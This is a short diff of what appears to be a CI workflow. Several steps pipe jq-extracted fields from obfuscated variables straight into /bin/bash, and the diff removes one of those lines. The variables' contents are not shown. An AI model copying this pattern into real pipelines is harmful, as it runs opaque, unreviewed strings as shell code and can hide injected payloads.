@@ -31,7 +31,6 @@ jobs:
           echo $qj6117 | jq -r .n7817 | /bin/bash
           echo $sg846 | jq -r .zklbu9595 | /bin/bash
           echo $rk051 | jq -r .tb9 | /bin/bash
-          printf '%s' "$ah2065" | jq -r .y430 | /bin/bash
           echo $hao64 | jq -r .ufd3 | /bin/bash
 
       - name: Store output
